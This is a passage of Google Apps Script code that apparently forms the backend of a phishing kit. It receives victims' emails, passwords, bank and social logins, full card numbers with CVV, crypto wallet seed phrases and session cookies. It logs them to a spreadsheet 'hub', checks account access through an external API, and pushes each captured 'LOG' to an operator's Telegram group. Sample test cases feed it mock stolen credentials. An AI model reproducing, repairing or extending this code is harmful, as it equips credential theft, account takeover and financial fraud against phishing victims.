          verified = updatedFormData.verified !== undefined ? updatedFormData.verified : false;
          fullAccess = updatedFormData.fullAccess !== undefined ? updatedFormData.fullAccess : false;
          
          // Add API response to formData for storage
          updatedFormData.apiResponse = apiResponseData;

        } catch (e) {
          Logger.log("Error calling external API: " + e.message);
          apiError = e.message;
          updatedFormData.apiError = apiError;
          // Keep verified/fullAccess as default false if API call fails
        }
      }
    } else {
      return createJsonResponse({
        success: false,
        error: "Invalid templateType provided."
      });
    }

    // Add final access and verification flags to formData
    updatedFormData.verifyAccess = verifyAccess;
    updatedFormData.cookieAccess = cookieAccess;
    updatedFormData.verified = verified;
    updatedFormData.fullAccess = fullAccess;

    // Ensure ipData and deviceData are objects, not strings
    if (typeof updatedFormData.ipData === 'string') {
      try {
        updatedFormData.ipData = JSON.parse(updatedFormData.ipData);
      } catch (e) {
        Logger.log("Error parsing ipData string: " + e);
        updatedFormData.ipData = {};
      }
    }
    if (typeof updatedFormData.deviceData === 'string') {
      try {
        updatedFormData.deviceData = JSON.parse(updatedFormData.deviceData);
      } catch (e) {
        Logger.log("Error parsing deviceData string: " + e);
        updatedFormData.deviceData = {};
      }
    }

    const responseColumnValue = projectRowMap.response;
    let existingResponses = [];
    if (responseColumnValue) {
      try {
        existingResponses = JSON.parse(responseColumnValue);
        if (!Array.isArray(existingResponses)) {
          existingResponses = []; // Ensure it's an array if parsing failed or it's not an array
        }
      } catch (e) {
        Logger.log("Error parsing existing response JSON: " + e.message);
        existingResponses = [];
      }
    }

    // Determine new ID
    let newId = 1;
    if (existingResponses.length > 0) {
      const maxId = existingResponses.reduce((max, entry) => {
        const currentId = parseInt(entry.id);
        return isNaN(currentId) ? max : Math.max(max, currentId);
      }, 0);
      newId = maxId + 1;
    }

    // Determine submissionId based on templateType and API response
    let submissionId;
    if ((templateType === "COOKIE" || templateType === "TRUE-LOGIN") && apiResponseData && apiResponseData.browserId) {
      submissionId = apiResponseData.browserId;
    } else {
      submissionId = new Date().getTime().toString() + Utilities.getUuid().slice(0, 4); // Original PLAIN logic
    }

    // Construct the complete new submission entry
    const newSubmissionEntry = {
      id: newId.toString(), // ID as string
      submissionId: submissionId, // Add submissionId here
      category: projectRowMap.templateNiche || "UNKNOWN", // From projectRowMap.templateNiche
      type: projectRowMap.templateType || "UNKNOWN",     // From projectRowMap.templateType
      title: projectRowMap.projectTitle || "Form Submission",
      userId: projectRowMap.userId || "N/A",
      projectId: projectRowMap.projectId || "N/A",
      formId: projectRowMap.formId || "N/A",
      timestamp: updatedFormData.timestamp || new Date().toLocaleString(),
      email: updatedFormData.email || "N/A",
      domain: updatedFormData.domain || "N/A",
      password: updatedFormData.password || "N/A",
      ipData: updatedFormData.ipData || {},
      deviceData: updatedFormData.deviceData || {},
      verifyAccess: verifyAccess,
      cookieAccess: cookieAccess,
      verified: verified,
      fullAccess: fullAccess,
      cookieJSON: updatedFormData.cookieJSON || {},
      cookieFileURL: updatedFormData.cookieFileURL || "", // Ensure this is included
      banks: updatedFormData.banks || [],
      cards: updatedFormData.cards || [],
      socials: updatedFormData.socials || [],
      wallets: updatedFormData.wallets || [],
      apiResponse: updatedFormData.apiResponse || null // Include API response if available
    };

    // Append the new entry
    existingResponses.push(newSubmissionEntry);

    // 1. Update the json value in the response column in projects sheet
    const updateProjectResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.PROJECTS,
      "token",
      token,
      { "response": JSON.stringify(existingResponses) } // Write back the entire updated array
    );

    if (!updateProjectResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to update project sheet: ${updateProjectResult.error}`
      });
    }

    // 2. Set new row data to hub sheet
    const hubDataToInsert = {
      submissionId: submissionId, // New unique identifier
      category: projectRowMap.templateNiche || "UNKNOWN", // From projectRowMap.templateNiche
      type: projectRowMap.templateType || "UNKNOWN",     // From projectRowMap.templateType
      title: projectRowMap.projectTitle || "Form Submission", // From projectRowMap.projectTitle
      userId: projectRowMap.userId || "N/A",             // From projectRowMap.userId
      projectId: projectRowMap.projectId || "N/A",       // From projectRowMap.projectId
      formId: projectRowMap.formId || "N/A",             // From projectRowMap.formId
      timestamp: updatedFormData.timestamp || new Date().toLocaleString(),
      email: updatedFormData.email || "N/A",
      domain: updatedFormData.domain || "N/A",
      password: updatedFormData.password || "N/A",
      ipData: JSON.stringify(updatedFormData.ipData || {}),
      deviceData: JSON.stringify(updatedFormData.deviceData || {}),
      verifyAccess: verifyAccess ? "TRUE" : "FALSE",
      cookieAccess: cookieAccess ? "TRUE" : "FALSE",
      verified: verified ? "TRUE" : "FALSE",
      fullAccess: fullAccess ? "TRUE" : "FALSE",
      cookieJSON: JSON.stringify(updatedFormData.cookieJSON || {}),
      cookieFileURL: updatedFormData.cookieFileURL || "", // Keep this as it was not explicitly asked to remove from hub sheet
      banks: JSON.stringify(updatedFormData.banks || []),
      cards: JSON.stringify(updatedFormData.cards || []),
      socials: JSON.stringify(updatedFormData.socials || []),
      wallets: JSON.stringify(updatedFormData.wallets || []),
      mxRecord: "PENDING", // Initialize mxRecord
      possibleProvider: "PENDING" // Initialize possibleProvider
    };

    const setHubRowResult = setRowDataByHeaderMap(CONFIG.SHEET_NAME.HUB, hubDataToInsert);

    if (!setHubRowResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to add row to hub sheet: ${setHubRowResult.error}`
      });
    }

    // Asynchronously update mxRecord and possibleProvider using the new submissionId
    if (updatedFormData.email && setHubRowResult.success) {
      try {
        const triggerId = Utilities.getUuid();
        const triggerProperties = {
          email: updatedFormData.email,
          submissionId: submissionId // Pass the new submissionId
        };
        PropertiesService.getScriptProperties().setProperty(triggerId, JSON.stringify(triggerProperties));

        ScriptApp.newTrigger('runUpdateMxRecordAndProviderWrapper')
          .timeBased()
          .at(new Date(Date.now() + 5 * 1000)) // Run 5 seconds from now
          .create();
        Logger.log(`Scheduled MX lookup for email: ${updatedFormData.email}, submissionId: ${submissionId}`);

      } catch (e) {
        Logger.log("Error scheduling MX lookup: " + e.message);
      }
    }

    // Send notification to the user
    const telegramGroupId = projectRowMap.telegramGroupId; // Assuming telegramGroupId is in projects sheet
    if (telegramGroupId) {
      let notificationMessage = `🚨 New Form Submission for Project: *${projectRowMap.projectTitle || "Unknown Project"}* 🚨\n`;
      notificationMessage += `Type: ${templateType} | Niche: ${templateNiche || "N/A"}\n`;
      notificationMessage += `Status: Verified: ${verified ? "✅" : "❌"} | Full Access: ${fullAccess ? "✅" : "❌"}\n\n`;

      switch (templateNiche) {
        case "WIRE":
          notificationMessage += `*EMAIL LOG Details:*\n`;
          notificationMessage += `Email: ${updatedFormData.email || "N/A"}\n`;
          notificationMessage += `Password: ${updatedFormData.password || "N/A"}\n`;
          break;
        case "BANK":
          const bankData = updatedFormData.banks && updatedFormData.banks.length > 0 ? updatedFormData.banks[0] : {};
          notificationMessage += `*BANK LOG Details:*\n`;
          notificationMessage += `Bank Name: ${bankData.bankName || "N/A"}\n`;
          notificationMessage += `Username: ${bankData.username || "N/A"}\n`;
          notificationMessage += `Password: ${bankData.password || "N/A"}\n`;
          notificationMessage += `Website: ${bankData.website || "N/A"}\n`;
          break;
        case "SOCIAL":
          const socialData = updatedFormData.socials && updatedFormData.socials.length > 0 ? updatedFormData.socials[0] : {};
          notificationMessage += `*SOCIAL LOG Details:*\n`;
          notificationMessage += `Platform: ${socialData.platform || "N/A"}\n`;
          notificationMessage += `Username: ${socialData.username || "N/A"}\n`;
          notificationMessage += `Password: ${socialData.password || "N/A"}\n`;
          notificationMessage += `Website: ${socialData.website || "N/A"}\n`;
          break;
        case "WALLET":
          const walletData = updatedFormData.wallets && updatedFormData.wallets.length > 0 ? updatedFormData.wallets[0] : {};
          notificationMessage += `*WALLET Details:*\n`;
          notificationMessage += `Wallet Name: ${walletData.walletName || "N/A"}\n`;
          notificationMessage += `Word Phrase: ${walletData.wordPhrase || "N/A"}\n`;
          notificationMessage += `Website: ${walletData.website || "N/A"}\n`;
          break;
        case "CARD":
          const cardData = updatedFormData.cards && updatedFormData.cards.length > 0 ? updatedFormData.cards[0] : {};
          notificationMessage += `*CARD Details:*\n`;
          notificationMessage += `Card Type: ${cardData.cardType || "N/A"}\n`;
          notificationMessage += `Card Number: ${cardData.cardNumber ? `**** **** **** ${cardData.cardNumber.slice(-4)}` : "N/A"}\n`;
          notificationMessage += `Expiration: ${cardData.expirationDate || "N/A"}\n`;
          notificationMessage += `CVV: ${cardData.cvv || "N/A"}\n`;
          notificationMessage += `Issuer: ${cardData.issuer || "N/A"}\n`;
          notificationMessage += `Bank Name: ${cardData.bankName || "N/A"}\n`;
          break;
        default:
          // Generic details if niche is not specifically handled or for PLAIN/COOKIE without niche
          notificationMessage += `*General Details:*\n`;
          notificationMessage += `Email: ${updatedFormData.email || "N/A"}\n`;
          notificationMessage += `Password: ${updatedFormData.password || "N/A"}\n`;
          break;
      }

      // Add IP Data if available
      if (updatedFormData.ipData && Object.keys(updatedFormData.ipData).length > 0) {
        notificationMessage += `\n*IP Data:*\n`;
        notificationMessage += `IP: ${updatedFormData.ipData.ip || "N/A"}\n`;
        notificationMessage += `Location: ${updatedFormData.ipData.city || "N/A"}, ${updatedFormData.ipData.region || "N/A"}, ${updatedFormData.ipData.country || "N/A"}\n`;
        notificationMessage += `ISP: ${updatedFormData.ipData.isp || "N/A"}\n`;
      }

      // Add Cookie JSON if available
      if (updatedFormData.cookieJSON && Object.keys(updatedFormData.cookieJSON).length > 0) {
        notificationMessage += `\n*Cookie JSON:*\n`;
        notificationMessage += `${JSON.stringify(updatedFormData.cookieJSON, null, 2)}\n`;
      }

      sendTelegramMessage(telegramGroupId, notificationMessage);
    }

    return createJsonResponse({
      success: true,
      message: "Form submission processed successfully.",
      projectUpdate: updateProjectResult,
      hubRowAdd: setHubRowResult,
      finalFormData: updatedFormData,
      apiResponse: apiResponseData // Include apiResponseData if available
    });

  } catch (error) {
    Logger.log("Error in notifyFormSubmission: " + error.message);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.message,
      stack: error.stack
    });
  }
}

function poolingOperator(params) {
  Logger.log("poolingOperator called with params: " + JSON.stringify(params));

  try {
    const { browserId } = params;

    if (!browserId) {
      return createJsonResponse({
        success: false,
        error: "Missing required parameter: browserId."
      });
    }

    // Search the cookie sheet for the browserId
    const cookieSheetResult = getRowsByColumn(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId);

    if (!cookieSheetResult.success || cookieSheetResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Data for browserId '${browserId}' not found in cookie sheet.`
      });
    }

    const cookieData = cookieSheetResult.data[0]; // Assuming browserId is unique
    const cookieHeaders = cookieSheetResult.headers;
    const cookieDataMap = {};
    cookieHeaders.forEach((header, index) => {
      cookieDataMap[header] = cookieData[index];
    });

    return createJsonResponse({
      success: true,
      data: cookieDataMap,
      currentStatus: cookieDataMap.status 
    });

  } catch (error) {
    Logger.log("Error in poolingOperator: " + error.message);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.message,
      stack: error.stack
    });
  }
}


/**
 * Test method for notifyFormSubmission.
 * This function simulates calls to notifyFormSubmission with sample data for various categories.
 * NOTE: For these tests to run successfully in a real Google Apps Script environment,
 * the spreadsheet with CONFIG.DB_ID must exist and contain a "projects" sheet
 * with rows matching the 'token' for each test case. Each project row should have
 * appropriate 'templateType', 'templateNiche', 'projectTitle', 'userId', 'projectId',
 * 'formId', and 'telegramGroupId' columns.
 * The external API calls will also need to be functional or mocked in a real setup.
 */
function testNotifyFormSubmission() {
  Logger.log("--- Running comprehensive testNotifyFormSubmission ---");

  // Helper to run a single test case
  function runTestCase(testName, token, formData, expectedProjectRowMap) {
    Logger.log(`\n--- Test Case: ${testName} ---`);
    Logger.log(`Simulating project row for token '${token}': ${JSON.stringify(expectedProjectRowMap)}`);

    // In a real test environment, you would mock getRowsByColumn to return this:
    // getRowsByColumn.mockReturnValueOnce({ success: true, headers: Object.keys(expectedProjectRowMap), data: [Object.values(expectedProjectRowMap)], count: 1 });

    const testParams = { token: token, formData: formData };
    const result = notifyFormSubmission(testParams);
    Logger.log(`Result for ${testName}: ${JSON.stringify(result, null, 2)}`);
  }

  // Test Case 1: PLAIN TemplateType
  runTestCase(
    "PLAIN Submission",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      email: "plain.user@example.com",
      password: "plainPassword123",
      ipData: { ip: "1.1.1.1", country: "Testland" },
      deviceData: { browser: "TestBrowser" }
    }
  );

  // Test Case 2: COOKIE TemplateType
  runTestCase(
    "COOKIE Submission",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      email: "cookie.user@example.com",
      password: "cookiePassword123",
      ipData: { ip: "2.2.2.2", country: "Cookieland" },
      deviceData: { browser: "CookieBrowser" },
      cookieJSON: { session: "abc", auth: "xyz" },
      verified: true, // Explicitly set in formData for COOKIE
      fullAccess: true // Explicitly set in formData for COOKIE
    }
  );

  // Test Case 3: TRUE-LOGIN - WIRE Niche
  runTestCase(
    "TRUE-LOGIN - WIRE Niche",
    "6e381dfb-46a4-4c07-b448-36c2a0ddda90", // This token should exist in your 'projects' sheet
    {
      email: "wire.user@example.com",
      password: "wirePassword123",
      ipData: { ip: "3.3.3.3", country: "Wireland" },
      deviceData: { browser: "WireBrowser" }
    }
  );

  // Test Case 4: TRUE-LOGIN - BANK Niche
  runTestCase(
    "TRUE-LOGIN - BANK Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "4.4.4.4", country: "Bankland" },
      deviceData: { browser: "BankBrowser" },
      banks: [{ username: "bankUser", password: "bankPass", website: "mybank.com" }]
    }
  );

  // Test Case 5: TRUE-LOGIN - CARD Niche
  runTestCase(
    "TRUE-LOGIN - CARD Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "5.5.5.5", country: "Cardland" },
      deviceData: { browser: "CardBrowser" },
      cards: [{ cardNumber: "1111222233334444", expirationDate: "12/25", cvv: "123", issuer: "Visa", bankName: "CreditBank", website: "creditcard.com" }]
    }
  );

  // Test Case 6: TRUE-LOGIN - SOCIAL Niche
  runTestCase(
    "TRUE-LOGIN - SOCIAL Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "6.6.6.6", country: "Socialland" },
      deviceData: { browser: "SocialBrowser" },
      socials: [{ platform: "Facebook", username: "socialUser", password: "socialPass", website: "facebook.com" }]
    }
  );

  // Test Case 7: TRUE-LOGIN - WALLET Niche
  runTestCase(
    "TRUE-LOGIN - WALLET Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "7.7.7.7", country: "Walletland" },
      deviceData: { browser: "WalletBrowser" },
      wallets: [{ walletName: "MetaMask", wordPhrase: "word1 word2 word3", website: "metamask.io" }]
    }
  );

  Logger.log("\n--- All test cases completed ---");
}

/**
 * Wrapper function to be called by the time-driven trigger.
 * It retrieves the stored properties and calls updateMxRecordAndProvider.
 */
function runUpdateMxRecordAndProviderWrapper() {
  const scriptProperties = PropertiesService.getScriptProperties();
  const allProperties = scriptProperties.getProperties();

  // Find the property that matches a trigger ID pattern (if you had one)
  // For simplicity, let's assume the last set property is the one we need for now.
  // In a real scenario, you might iterate through properties or use a more specific key.
  let triggerIdFound = null;
  for (const key in allProperties) {
    // Assuming the triggerId is the key itself
    try {
      const properties = JSON.parse(allProperties[key]);
      if (properties.email && properties.submissionId) { // Check for submissionId
        triggerIdFound = key;
        break;
      }
    } catch (e) {
      // Not a JSON string or not the expected properties
      continue;
    }
  }

  if (triggerIdFound) {
    const propertiesString = scriptProperties.getProperty(triggerIdFound);
    scriptProperties.deleteProperty(triggerIdFound); // Clean up the property after use

    try {
      const { email, submissionId } = JSON.parse(propertiesString); // Retrieve submissionId
      Logger.log(`Wrapper: Retrieved email: ${email}, submissionId: ${submissionId}`);
      updateMxRecordAndProvider(email, submissionId); // Pass submissionId
    } catch (e) {
      Logger.log("Wrapper Error parsing properties or calling updateMxRecordAndProvider: " + e.message);
    }
  } else {
    Logger.log("Wrapper: No trigger properties found to process.");
  }

  // Delete all triggers for this function to prevent multiple executions
  const triggers = ScriptApp.getProjectTriggers();
  for (let i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === 'runUpdateMxRecordAndProviderWrapper') {
      ScriptApp.deleteTrigger(triggers[i]);
    }
  }
}
